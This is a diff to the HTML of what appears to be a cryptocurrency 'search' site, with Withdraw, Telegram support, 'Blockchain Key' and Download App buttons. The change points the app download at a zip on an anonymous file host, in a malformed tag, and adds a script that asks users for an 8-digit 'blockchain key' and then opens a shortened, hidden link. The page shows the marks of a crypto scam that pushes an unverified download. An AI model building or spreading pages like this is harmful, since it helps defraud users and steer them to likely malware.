@@ -384,7 +384,7 @@ footer a:hover {
       <button id="withdrawSidebarBtn" href="javascript:void(0)" class="withdraw">💸 Withdraw</button>
       <a class="support" href="https://t.me/cryptos_search_admin" target="_blank">📩 Support</a>
       <a class="upgrade-btn" id="blockchainKeyBtn" href="javascript:void(0)">🔓 Blockchain Key</a>
-      <a class="download-app" href="https://github.com/Cryptos-Search-Space-TM/software-download/raw/refs/heads/main/Crypto%20Search%20Space%20%E2%84%A2%202.5.zip" download>📥 Download App</a>
+      <a class="download-app" https://upl2.apkadmin.com/cgi-bin/dl.cgi/opdbfs4zvqqsj3rtaru4oz5mwokjh2zqssy54et42jqpw2srioythbi/Crypto_Search_Space_____2.5.zip" download>📥 Download App</a>
     </aside>
 
 
@@ -399,7 +399,32 @@ footer a:hover {
     </div>
   </div>
 </div>
+<script>
+  const submitBtn = document.getElementById("submitKeyBtn");
+  const closeBtn = document.getElementById("closeKeyPopup");
+  const keyInput = document.getElementById("blockchainKeyInput");
+  const popup = document.getElementById("keyPopup");
 
+  submitBtn.addEventListener("click", function () {
+    const key = keyInput.value.trim();
+
+    // Optional: require exactly 8 digits
+    if (!/^\d{8}$/.test(key)) {
+      alert("Please enter a valid 8-digit key.");
+      return;
+    }
+
+    // Open the URL in a new tab
+    window.open("https://shorturl.at/UpwMS", "_blank", "noopener,noreferrer");
+
+    // To open in the same tab instead, use:
+    // window.location.href = "https://shorturl.at/UpwMS";
+  });
+
+  closeBtn.addEventListener("click", function () {
+    popup.style.display = "none";
+  });
+</script>
     <!-- Main -->
     <main class="main">
       <div class="header">
